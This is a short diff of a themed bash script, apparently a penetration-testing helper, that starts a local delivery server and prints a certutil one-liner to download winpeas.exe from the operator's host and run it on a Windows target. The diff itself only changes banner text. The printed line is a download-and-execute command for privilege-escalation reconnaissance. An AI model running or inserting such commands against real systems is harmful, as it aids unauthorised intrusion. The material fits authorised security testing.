@@ -22,7 +22,7 @@ run_peas_delivery() {
     STATE[web_server_pid]="$server_pid"
 
     echo -e "${TXT_DRK_RED}============================================================${NC}"
-    echo -e "${TXT_PULSE_RED}[///] LOCAL SHADOW SERVER ACTIVE ON ${TXT_CORE}${lhost}:${lport}${NC}"
+    echo -e "${TXT_PULSE_RED}[///] EFUSE KERNEL MEMORY ACTIVE: LOCAL PEAS SERVER ONLINE${NC}"
     echo -e "${TXT_DRK_RED}============================================================${NC}\n"
 
     ai_speak "Deliver the simulacrum. Let them analyze their own ruin."
@@ -34,7 +34,7 @@ run_peas_delivery() {
     echo -e "${TXT_CORE}certutil -urlcache -f http://${lhost}:${lport}/winpeas.exe winpeas.exe && winpeas.exe${NC}"
 
     echo -e "\n${TXT_DRK_RED}------------------------------------------------------------${NC}"
-    echo -e "${TXT_SCARLET}[!] Press Enter to terminate the local delivery server...${NC}"
+    echo -e "${TXT_SCARLET}[!] Press Enter to terminate local BLACKWALL delivery server...${NC}"
     echo -e "${TXT_DRK_RED}------------------------------------------------------------${NC}"
     read -r
 
